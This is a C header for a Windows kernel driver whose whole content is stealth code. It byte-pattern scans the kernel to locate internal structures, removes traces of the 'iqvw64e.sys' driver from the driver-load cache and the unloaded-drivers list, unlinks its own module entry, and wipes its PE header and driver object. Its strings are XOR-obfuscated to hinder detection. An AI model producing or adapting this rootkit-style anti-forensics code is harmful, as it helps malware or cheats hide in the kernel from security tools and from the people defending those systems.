#pragma once

#include "definitions.h"

static PVOID s_CoreBase = NULL;
static ULONG s_CoreSize = 0;

static PVOID ComputeRipTarget(PVOID Instruction, ULONG OffsetOffset,
                              ULONG InstructionSize) {
  ULONG_PTR Instr = (ULONG_PTR)Instruction;
  LONG RipOffset = *(PLONG)(Instr + OffsetOffset);
  return (PVOID)(Instr + InstructionSize + RipOffset);
}

static NTSTATUS ScanBytes(const UCHAR *pattern, UCHAR wildcard, ULONG_PTR len,
                          const void *base, ULONG_PTR size, PVOID *ppFound) {
  if (!ppFound || !pattern || !base)
    return STATUS_INVALID_PARAMETER;

  for (ULONG_PTR i = 0; i < size - len; i++) {
    BOOLEAN found = TRUE;
    for (ULONG_PTR j = 0; j < len; j++) {
      if (pattern[j] != wildcard &&
          pattern[j] != ((const UCHAR *)base)[i + j]) {
        found = FALSE;
        break;
      }
    }
    if (found) {
      *ppFound = (PUCHAR)base + i;
      return STATUS_SUCCESS;
    }
  }
  return STATUS_NOT_FOUND;
}

static PVOID GetCoreModule(PULONG pSize) {
  if (s_CoreBase) {
    if (pSize)
      *pSize = s_CoreSize;
    return s_CoreBase;
  }

  WCHAR routineBuf[] = {L'N' ^ MASK_BYTE, L't' ^ MASK_BYTE, L'O' ^ MASK_BYTE,
                        L'p' ^ MASK_BYTE, L'e' ^ MASK_BYTE, L'n' ^ MASK_BYTE,
                        L'F' ^ MASK_BYTE, L'i' ^ MASK_BYTE, L'l' ^ MASK_BYTE,
                        L'e' ^ MASK_BYTE, L'\0' ^ MASK_BYTE};
  UnmaskBufferW(routineBuf, sizeof(routineBuf), MASK_BYTE);

  UNICODE_STRING routineName;
  RtlInitUnicodeString(&routineName, routineBuf);
  PVOID checkPtr = MmGetSystemRoutineAddress(&routineName);
  if (!checkPtr)
    return NULL;

  ULONG bytes = 0;
  ZwQuerySystemInformation(SysModuleQuery, 0, bytes, &bytes);
  if (bytes == 0)
    return NULL;

  PSYS_MODULE_LIST pMods = (PSYS_MODULE_LIST)ExAllocatePoolWithTag(
      NonPagedPool, bytes, POOL_WIPE);
  if (!pMods)
    return NULL;
  RtlZeroMemory(pMods, bytes);

  NTSTATUS status =
      ZwQuerySystemInformation(SysModuleQuery, pMods, bytes, &bytes);
  if (NT_SUCCESS(status)) {
    for (ULONG i = 0; i < pMods->NumberOfModules; i++) {
      if (checkPtr >= pMods->Modules[i].ImageBase &&
          checkPtr < (PVOID)((PUCHAR)pMods->Modules[i].ImageBase +
                             pMods->Modules[i].ImageSize)) {
        s_CoreBase = pMods->Modules[i].ImageBase;
        s_CoreSize = pMods->Modules[i].ImageSize;
        if (pSize)
          *pSize = s_CoreSize;
        break;
      }
    }
  }
  ExFreePoolWithTag(pMods, POOL_WIPE);
  return s_CoreBase;
}

static NTSTATUS SearchSegment(const char *section, const UCHAR *pattern,
                              UCHAR wildcard, ULONG_PTR len, PVOID *ppFound) {
  if (!ppFound)
    return STATUS_INVALID_PARAMETER;

  PVOID base = GetCoreModule(NULL);
  if (!base)
    return STATUS_NOT_FOUND;

  PIMAGE_NT_HEADERS64 pHdr = (PIMAGE_NT_HEADERS64)RtlImageNtHeader(base);
  if (!pHdr)
    return STATUS_INVALID_IMAGE_FORMAT;

  PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + 1);
  for (PIMAGE_SECTION_HEADER pSec = pFirstSection;
       pSec < pFirstSection + pHdr->FileHeader.NumberOfSections; pSec++) {
    char pageBuf[] = {'P' ^ MASK_BYTE, 'A' ^ MASK_BYTE, 'G' ^ MASK_BYTE,
                      'E' ^ MASK_BYTE, '\0' ^ MASK_BYTE};
    UnmaskBuffer(pageBuf, sizeof(pageBuf), MASK_BYTE);

    ANSI_STRING s1, s2;
    RtlInitAnsiString(&s1, pageBuf);
    RtlInitAnsiString(&s2, (PCCHAR)pSec->Name);
    if (RtlCompareString(&s1, &s2, TRUE) == 0) {
      PVOID ptr = NULL;
      NTSTATUS st = ScanBytes(pattern, wildcard, len,
                              (PUCHAR)base + pSec->VirtualAddress,
                              pSec->Misc.VirtualSize, &ptr);
      if (NT_SUCCESS(st))
        *(PULONG_PTR)ppFound = (ULONG_PTR)ptr - (ULONG_PTR)base;
      return st;
    }
  }
  return STATUS_NOT_FOUND;
}

static BOOLEAN FindDbCache(PERESOURCE *lock, PRTL_AVL_TABLE *table) {
  UCHAR DbLockPtr_sig[] = "\x48\x8D\x0D\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC"
                          "\x48\x8B\x0D\xCC\xCC\xCC\xCC\x33\xDB";
  UCHAR DbTablePtr_sig[] = "\x48\x8D\x0D\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC"
                           "\x3D\xCC\xCC\xCC\xCC\x0F\x83\xCC\xCC\xCC\xCC";

  PVOID DbLockPtr = NULL;
  if (!NT_SUCCESS(SearchSegment("PAGE", DbLockPtr_sig, 0xCC,
                                sizeof(DbLockPtr_sig) - 1, &DbLockPtr)))
    return FALSE;

  PVOID DbTablePtr = NULL;
  if (!NT_SUCCESS(SearchSegment("PAGE", DbTablePtr_sig, 0xCC,
                                sizeof(DbTablePtr_sig) - 1, &DbTablePtr)))
    return FALSE;

  UINT64 realLock = (UINT64)s_CoreBase + (UINT64)DbLockPtr;
  UINT64 realTable = (UINT64)s_CoreBase + (UINT64)DbTablePtr;

  *lock = (PERESOURCE)ComputeRipTarget((PVOID)realLock, 3, 7);
  *table = (PRTL_AVL_TABLE)ComputeRipTarget((PVOID)realTable, 3, 7);
  return TRUE;
}

#define DB_TIMESTAMP 0x5284EAC3

static BOOLEAN EraseDbCacheEntry() {
  PERESOURCE DbLock = NULL;
  PRTL_AVL_TABLE DbCacheTable = NULL;

  if (!FindDbCache(&DbLock, &DbCacheTable))
    return FALSE;
  if (!DbLock || !DbCacheTable)
    return FALSE;

  WCHAR driverBuf[] = {L'i' ^ MASK_BYTE, L'q' ^ MASK_BYTE, L'v' ^ MASK_BYTE,
                       L'w' ^ MASK_BYTE, L'6' ^ MASK_BYTE, L'4' ^ MASK_BYTE,
                       L'e' ^ MASK_BYTE, L'.' ^ MASK_BYTE, L's' ^ MASK_BYTE,
                       L'y' ^ MASK_BYTE, L's' ^ MASK_BYTE, L'\0' ^ MASK_BYTE};
  UnmaskBufferW(driverBuf, sizeof(driverBuf), MASK_BYTE);

  PIDB_ENTRY lookupEntry;
  UNICODE_STRING driverName;
  RtlInitUnicodeString(&driverName, driverBuf);
  lookupEntry.ImageName = driverName;
  lookupEntry.TimeDateStamp = DB_TIMESTAMP;

  ExAcquireResourceExclusiveLite(DbLock, TRUE);

  PIDB_ENTRY *pFound = (PIDB_ENTRY *)RtlLookupElementGenericTableAvl(
      DbCacheTable, &lookupEntry);
  if (pFound) {
    RemoveEntryList(&pFound->ListLink);
    RtlDeleteElementGenericTableAvl(DbCacheTable, pFound);
  }

  ExReleaseResourceLite(DbLock);
  return (pFound != NULL);
}

typedef struct _UNLOADED_MODULE_INFO {
  UNICODE_STRING Name;
  PVOID ModuleStart;
  PVOID ModuleEnd;
  LARGE_INTEGER UnloadTime;
} UNLOADED_MODULE_INFO, *PUNLOADED_MODULE_INFO;

static BOOLEAN WipeUnloadedList() {
  UCHAR sig[] = "\x4C\x8B\xCC\xCC\xCC\xCC\xCC\x4C\x8B\xC9\x4D\x85\xCC\x74";
  PVOID offset = NULL;

  if (!NT_SUCCESS(SearchSegment("PAGE", sig, 0xCC, sizeof(sig) - 1, &offset)))
    return FALSE;

  UINT64 realAddr = (UINT64)s_CoreBase + (UINT64)offset;
  PUNLOADED_MODULE_INFO *pUnloadedDrivers =
      (PUNLOADED_MODULE_INFO *)ComputeRipTarget((PVOID)realAddr, 3, 7);

  if (!pUnloadedDrivers || !*pUnloadedDrivers)
    return FALSE;

  PUNLOADED_MODULE_INFO drivers = *pUnloadedDrivers;
  BOOLEAN cleaned = FALSE;

  for (int i = 0; i < 50; i++) {
    if (drivers[i].Name.Buffer == NULL)
      continue;

    WCHAR name1[] = {L'i' ^ MASK_BYTE, L'q' ^ MASK_BYTE, L'v' ^ MASK_BYTE,
                     L'w' ^ MASK_BYTE, L'6' ^ MASK_BYTE, L'4' ^ MASK_BYTE,
                     L'e' ^ MASK_BYTE, L'\0' ^ MASK_BYTE};
    WCHAR name2[] = {L'I' ^ MASK_BYTE, L'q' ^ MASK_BYTE, L'v' ^ MASK_BYTE,
                     L'w' ^ MASK_BYTE, L'6' ^ MASK_BYTE, L'4' ^ MASK_BYTE,
                     L'e' ^ MASK_BYTE, L'\0' ^ MASK_BYTE};
    UnmaskBufferW(name1, sizeof(name1), MASK_BYTE);
    UnmaskBufferW(name2, sizeof(name2), MASK_BYTE);

    if (wcsstr(drivers[i].Name.Buffer, name1) ||
        wcsstr(drivers[i].Name.Buffer, name2)) {
      RtlZeroMemory(drivers[i].Name.Buffer, drivers[i].Name.MaximumLength);
      RtlZeroMemory(&drivers[i], sizeof(UNLOADED_MODULE_INFO));
      cleaned = TRUE;
    }
  }

  return cleaned;
}

static VOID ObscureDriverObj(PDRIVER_OBJECT DriverObject) {
  if (!DriverObject)
    return;

  if (DriverObject->DriverSection) {
    PMODULE_ENTRY_KM entry =
        (PMODULE_ENTRY_KM)DriverObject->DriverSection;

    PLIST_ENTRY listEntry = (PLIST_ENTRY)entry;
    PLIST_ENTRY prev = listEntry->Blink;
    PLIST_ENTRY next = listEntry->Flink;
    if (prev && next) {
      prev->Flink = next;
      next->Blink = prev;
      listEntry->Flink = listEntry;
      listEntry->Blink = listEntry;
    }

    RtlZeroMemory(entry, sizeof(MODULE_ENTRY_KM));
  }

  __try {
    if (DriverObject->DriverStart) {
      PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)DriverObject->DriverStart;
      if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt =
            (PIMAGE_NT_HEADERS)((UCHAR *)DriverObject->DriverStart +
                                dos->e_lfanew);
        ULONG headerSize = nt->OptionalHeader.SizeOfHeaders;
        if (headerSize == 0 || headerSize > PAGE_SIZE)
          headerSize = PAGE_SIZE;
        RtlZeroMemory(DriverObject->DriverStart, headerSize);
      }
    }
  } __except (EXCEPTION_EXECUTE_HANDLER) {
  }

  RtlZeroMemory(DriverObject, sizeof(DRIVER_OBJECT));
}

static BOOLEAN RemoveAllFootprints(PDRIVER_OBJECT DriverObject) {
  BOOLEAN ok = TRUE;

  if (!EraseDbCacheEntry())
    ok = FALSE;

  WipeUnloadedList();

  ObscureDriverObj(DriverObject);

  return ok;
}
